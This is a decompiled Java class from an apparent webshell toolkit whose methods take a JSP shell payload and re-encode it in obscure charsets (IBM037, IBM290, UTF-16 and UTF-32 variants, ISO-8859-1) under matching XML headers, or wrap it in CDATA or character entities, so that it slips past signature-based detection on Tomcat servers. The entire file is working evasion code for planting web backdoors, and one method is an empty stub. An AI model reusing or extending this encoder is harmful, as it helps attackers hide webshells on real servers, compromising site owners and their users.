/*
 * Decompiled with CFR 0.153-SNAPSHOT (d6f6758-dirty).
 */
package shells.encoder.java;

import galaxy.jsp.encounter.charset.CharsetEncoder;
import galaxy.jsp.encounter.util.Utils;
import java.io.ByteArrayInputStream;
import java.io.IOException;
import java.io.InputStream;
import java.nio.charset.StandardCharsets;
import org.apache.commons.io.IOUtils;

public class jspencounter {
    public static byte[] jspx_double_encode(String fir_enc, String sec_enc, byte[] data) {
        return null;
    }

    public static byte[] jspx_doubule_ibm037(byte[] data) throws Exception {
        byte[] header = "<?xml version=\"1.0\" encoding='IBM037'?>".getBytes();
        ByteArrayInputStream header_inputStream = new ByteArrayInputStream(header);
        String header_str = IOUtils.toString((InputStream)header_inputStream, StandardCharsets.UTF_8);
        byte[] header_enc_byte_res = CharsetEncoder.Encode(header_str, "IBM037", true);
        ByteArrayInputStream inputStream = new ByteArrayInputStream(data);
        String shell_str = IOUtils.toString((InputStream)inputStream, StandardCharsets.UTF_8);
        byte[] enc_byte_res = CharsetEncoder.Encode(shell_str, "IBM037", true);
        byte[] final_byte = new byte[header_enc_byte_res.length + enc_byte_res.length];
        System.arraycopy(header_enc_byte_res, 0, final_byte, 0, header_enc_byte_res.length);
        System.arraycopy(enc_byte_res, 0, final_byte, header_enc_byte_res.length, enc_byte_res.length);
        return final_byte;
    }

    public static byte[] test1(byte[] data) throws Exception {
        byte[] enc_byte_res;
        ByteArrayInputStream inputStream = new ByteArrayInputStream(data);
        String shell_str = IOUtils.toString((InputStream)inputStream, StandardCharsets.UTF_8);
        byte[] final_byte = enc_byte_res = CharsetEncoder.Encode(shell_str, "UTF-16BE", false);
        return final_byte;
    }

    public static byte[] test2(byte[] data) throws Exception {
        byte[] header = "<?xml version=\"1.0\" encoding='ISO-8859-1'?>".getBytes();
        ByteArrayInputStream header_inputStream = new ByteArrayInputStream(header);
        String header_str = IOUtils.toString((InputStream)header_inputStream, StandardCharsets.UTF_8);
        byte[] header_enc_byte_res = CharsetEncoder.Encode(header_str, "ISO-8859-1", true);
        ByteArrayInputStream inputStream = new ByteArrayInputStream(data);
        String shell_str = IOUtils.toString((InputStream)inputStream, StandardCharsets.UTF_8);
        byte[] enc_byte_res = CharsetEncoder.Encode(shell_str, "ISO-8859-1", true);
        byte[] final_byte = new byte[header_enc_byte_res.length + enc_byte_res.length];
        System.arraycopy(header_enc_byte_res, 0, final_byte, 0, header_enc_byte_res.length);
        System.arraycopy(enc_byte_res, 0, final_byte, header_enc_byte_res.length, enc_byte_res.length);
        return final_byte;
    }

    public static byte[] tomcat_jsp_IBM037(byte[] data) throws Exception {
        byte[] header = "<?xml version=\"1.0\" encoding='IBM037'?>".getBytes();
        ByteArrayInputStream header_inputStream = new ByteArrayInputStream(header);
        String header_str = IOUtils.toString((InputStream)header_inputStream, StandardCharsets.UTF_8);
        byte[] header_enc_byte_res = CharsetEncoder.Encode(header_str, "IBM037", true);
        ByteArrayInputStream inputStream = new ByteArrayInputStream(data);
        String shell_str = IOUtils.toString((InputStream)inputStream, StandardCharsets.UTF_8);
        byte[] enc_byte_res = CharsetEncoder.Encode(shell_str, "IBM037", true);
        byte[] final_byte = new byte[header_enc_byte_res.length + enc_byte_res.length];
        System.arraycopy(header_enc_byte_res, 0, final_byte, 0, header_enc_byte_res.length);
        System.arraycopy(enc_byte_res, 0, final_byte, header_enc_byte_res.length, enc_byte_res.length);
        return final_byte;
    }

    public static byte[] tomcat_jsp_IBM290(byte[] data) throws Exception {
        byte[] header = "<?xml version=\"1.0\" encoding='IBM290'?>".getBytes();
        ByteArrayInputStream header_inputStream = new ByteArrayInputStream(header);
        String header_str = IOUtils.toString((InputStream)header_inputStream, StandardCharsets.UTF_8);
        byte[] header_enc_byte_res = CharsetEncoder.Encode(header_str, "IBM037", true);
        ByteArrayInputStream inputStream = new ByteArrayInputStream(data);
        String shell_str = IOUtils.toString((InputStream)inputStream, StandardCharsets.UTF_8);
        byte[] enc_byte_res = CharsetEncoder.Encode(shell_str, "IBM290", true);
        byte[] final_byte = new byte[header_enc_byte_res.length + enc_byte_res.length];
        System.arraycopy(header_enc_byte_res, 0, final_byte, 0, header_enc_byte_res.length);
        System.arraycopy(enc_byte_res, 0, final_byte, header_enc_byte_res.length, enc_byte_res.length);
        return final_byte;
    }

    public static byte[] tomcat_jsp_UTF_16BE(byte[] data) throws Exception {
        byte[] header = "<?xml version=\"1.0\" encoding='UTF-16BE'?>".getBytes();
        ByteArrayInputStream header_inputStream = new ByteArrayInputStream(header);
        String header_str = IOUtils.toString((InputStream)header_inputStream, StandardCharsets.UTF_8);
        byte[] header_enc_byte_res = CharsetEncoder.Encode(header_str, "UTF-16BE", true);
        ByteArrayInputStream inputStream = new ByteArrayInputStream(data);
        String shell_str = IOUtils.toString((InputStream)inputStream, StandardCharsets.UTF_8);
        byte[] enc_byte_res = CharsetEncoder.Encode(shell_str, "UTF-16BE", true);
        byte[] final_byte = new byte[header_enc_byte_res.length + enc_byte_res.length];
        System.arraycopy(header_enc_byte_res, 0, final_byte, 0, header_enc_byte_res.length);
        System.arraycopy(enc_byte_res, 0, final_byte, header_enc_byte_res.length, enc_byte_res.length);
        return final_byte;
    }

    public static byte[] tomcat_jsp_UTF_16LE(byte[] data) throws Exception {
        byte[] header = "<?xml version=\"1.0\" encoding='UTF-16LE'?>".getBytes();
        ByteArrayInputStream header_inputStream = new ByteArrayInputStream(header);
        String header_str = IOUtils.toString((InputStream)header_inputStream, StandardCharsets.UTF_8);
        byte[] header_enc_byte_res = CharsetEncoder.Encode(header_str, "UTF-16LE", true);
        ByteArrayInputStream inputStream = new ByteArrayInputStream(data);
        String shell_str = IOUtils.toString((InputStream)inputStream, StandardCharsets.UTF_8);
        byte[] enc_byte_res = CharsetEncoder.Encode(shell_str, "UTF-16LE", true);
        byte[] final_byte = new byte[header_enc_byte_res.length + enc_byte_res.length];
        System.arraycopy(header_enc_byte_res, 0, final_byte, 0, header_enc_byte_res.length);
        System.arraycopy(enc_byte_res, 0, final_byte, header_enc_byte_res.length, enc_byte_res.length);
        return final_byte;
    }

    public static byte[] tomcat_jsp_UTF_32BE(byte[] data) throws Exception {
        byte[] header = "<?xml version=\"1.0\" encoding='UTF-32BE'?>".getBytes();
        ByteArrayInputStream header_inputStream = new ByteArrayInputStream(header);
        String header_str = IOUtils.toString((InputStream)header_inputStream, StandardCharsets.UTF_8);
        byte[] header_enc_byte_res = CharsetEncoder.Encode(header_str, "UTF-32BE", true);
        ByteArrayInputStream inputStream = new ByteArrayInputStream(data);
        String shell_str = IOUtils.toString((InputStream)inputStream, StandardCharsets.UTF_8);
        byte[] enc_byte_res = CharsetEncoder.Encode(shell_str, "UTF-32BE", true);
        byte[] final_byte = new byte[header_enc_byte_res.length + enc_byte_res.length];
        System.arraycopy(header_enc_byte_res, 0, final_byte, 0, header_enc_byte_res.length);
        System.arraycopy(enc_byte_res, 0, final_byte, header_enc_byte_res.length, enc_byte_res.length);
        return final_byte;
    }

    public static byte[] tomcat_jsp_UTF_32LE(byte[] data) throws Exception {
        byte[] header = "<?xml version=\"1.0\" encoding='UTF-32LE'?>".getBytes();
        ByteArrayInputStream header_inputStream = new ByteArrayInputStream(header);
        String header_str = IOUtils.toString((InputStream)header_inputStream, StandardCharsets.UTF_8);
        byte[] header_enc_byte_res = CharsetEncoder.Encode(header_str, "UTF-32LE", true);
        ByteArrayInputStream inputStream = new ByteArrayInputStream(data);
        String shell_str = IOUtils.toString((InputStream)inputStream, StandardCharsets.UTF_8);
        byte[] enc_byte_res = CharsetEncoder.Encode(shell_str, "UTF-32LE", true);
        byte[] final_byte = new byte[header_enc_byte_res.length + enc_byte_res.length];
        System.arraycopy(header_enc_byte_res, 0, final_byte, 0, header_enc_byte_res.length);
        System.arraycopy(enc_byte_res, 0, final_byte, header_enc_byte_res.length, enc_byte_res.length);
        return final_byte;
    }

    public static byte[] tomcat_jsp_ISO_8859_1(byte[] data) throws Exception {
        byte[] header = "<?xml version=\"1.0\" encoding='ISO-8859-1'?>".getBytes();
        ByteArrayInputStream header_inputStream = new ByteArrayInputStream(header);
        String header_str = IOUtils.toString((InputStream)header_inputStream, StandardCharsets.UTF_8);
        byte[] header_enc_byte_res = CharsetEncoder.Encode(header_str, "ISO-8859-1", true);
        ByteArrayInputStream inputStream = new ByteArrayInputStream(data);
        String shell_str = IOUtils.toString((InputStream)inputStream, StandardCharsets.UTF_8);
        byte[] enc_byte_res = CharsetEncoder.Encode(shell_str, "ISO-8859-1", true);
        byte[] final_byte = new byte[header_enc_byte_res.length + enc_byte_res.length];
        System.arraycopy(header_enc_byte_res, 0, final_byte, 0, header_enc_byte_res.length);
        System.arraycopy(enc_byte_res, 0, final_byte, header_enc_byte_res.length, enc_byte_res.length);
        return final_byte;
    }

    public static byte[] jsp_cdata(byte[] data) throws IOException {
        ByteArrayInputStream inputStream = new ByteArrayInputStream(data);
        String shell_str = IOUtils.toString((InputStream)inputStream, StandardCharsets.UTF_8);
        String result = Utils.WrapWithCdata(shell_str, 10);
        byte[] final_byte = result.getBytes(StandardCharsets.UTF_8);
        return final_byte;
    }

    public static byte[] jsp_entity(byte[] data) throws IOException {
        ByteArrayInputStream inputStream = new ByteArrayInputStream(data);
        String shell_str = IOUtils.toString((InputStream)inputStream, StandardCharsets.UTF_8);
        String result = Utils.EscapeText(shell_str, true, 10);
        byte[] final_byte = result.getBytes(StandardCharsets.UTF_8);
        return final_byte;
    }
}

